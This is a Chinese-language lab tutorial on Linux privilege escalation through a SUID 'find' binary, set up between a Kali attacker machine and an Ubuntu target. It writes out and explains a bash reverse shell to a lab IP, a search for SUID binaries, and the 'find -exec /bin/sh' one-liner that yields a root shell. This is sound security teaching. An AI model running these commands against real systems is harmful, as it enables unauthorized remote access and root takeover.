### SUID find 命令提权

环境准备：一台 KaliLinux（攻击者）和一台 Ubuntu 12.04.5（靶标）

![](https://pic1.imgdb.cn/item/68bf548958cb8da5c88af39e.png)

靶机上执行命令搭建环境

```
sudo chmod 4777 /usr/bin/find
```

![](https://pic1.imgdb.cn/item/68c2edf758cb8da5c89e4ef1.png)

![](https://pic1.imgdb.cn/item/68bf54b358cb8da5c88af3bc.png)

在靶标上手动创建反弹 Shell 模拟已进入内网情况

```sh
bash -i >& /dev/tcp/192.168.41.151/6767 0>&1
```

**`bash -i`**

- 启动一个 **交互式 bash shell** (`-i` 代表 interactive)
- 这样子进程不会只是执行一次命令后退出，而是会等待用户输入

------

**`/dev/tcp/192.168.41.151/6767`**

- 在 **bash 内置的特殊文件系统**中，`/dev/tcp/HOST/PORT` 表示一个 TCP 连接
- 当你尝试对它进行重定向时，bash 会尝试连接指定的 IP 和端口
- 这里就是：尝试建立到 `192.168.41.151:6767` 的 TCP 连接

------

 **`>&`**

- 这是 **标准输出和标准错误的重定向**
- `>& target` 表示把 **stdout (1) 和 stderr (2)** 一起重定向到目标
- 在这里，目标是 `/dev/tcp/192.168.41.151/6767`，即远程 TCP 连接

------

**`0>&1`**

- 把 **标准输入 (0)** 重定向到 **标准输出 (1)**
- 而标准输出已经被重定向到远程 TCP 连接，因此输入也会来自那个连接

------

**综合效果**

- 启动一个交互式 bash shell (`bash -i`)
- 该 shell 的输入、输出、错误流都被重定向到远程 TCP 连接 (`192.168.41.151:6767`)
- **结果**：一旦远程主机在该端口上监听，执行这条命令的机器就会反向连接过去，并且把一个交互式 shell 提供给远程主机

![](https://pic1.imgdb.cn/item/68bf558958cb8da5c88af412.png)

KaliLinux 监听

![](https://pic1.imgdb.cn/item/68bf559e58cb8da5c88af41b.png)

执行命令查找含有 SUID 权限的命令

```
find / -type f -perm /4000 2>/dev/null
```

**1. `find /`**

- **作用**：从根目录 `/` 开始递归查找整个文件系统

------

**2. `-type -f`**

- **说明**：`-type f` 表示只查找 **普通文件**（regular file）

------

**3. `-perm /4000`**

- **说明**：匹配文件权限位中含有 **SUID 位 (Set User ID on execution)** 的文件
- `/4000` 含义：
  - `/` 表示“按位或匹配”，只要有 **4000** 位，就会被匹配
  - `4000` 表示 SUID 权限位

👉 因此，这里会找到系统中所有设置了 **SUID** 的二进制文件（如 `/usr/bin/passwd`）

------

**4. `2>/dev/null`**

- **说明**：把 **标准错误输出 (stderr)** 重定向到 `/dev/null`，也就是把错误信息丢掉
- 例如，在遍历 `/proc`、`/sys` 等目录时可能会报“权限不足”错误，这样就不会显示出来

![](https://pic1.imgdb.cn/item/68c6c3a6c5157e1a88016348.png)

利用 find 提权

```sh
find . -exec /bin/sh \; -quit
```

`find .`：从当前目录开始遍历

`-exec /bin/sh \;`：对每个匹配到的条目执行 `/bin/sh`。注意这里没有 `{}`，也就是说 `find` 只是运行 `/bin/sh` 这个命令（每次匹配都会启动一次 shell），而不是把匹配的文件名作为参数传给 shell

`-quit`：遇到第一个匹配后立即退出（因此只会启动一次 `/bin/sh`），避免继续遍历

如果 `find` 在高权限上下文中运行（例如被 root/管理员身份执行的脚本、cron job、或者某个有特权的进程间接调用 `find`），那么 `-exec /bin/sh` 会在那个高权限上下文下启动 shell，从而直接获得高权限交互式 shell

![](https://pic1.imgdb.cn/item/68c6c5c2c5157e1a8801649f.png)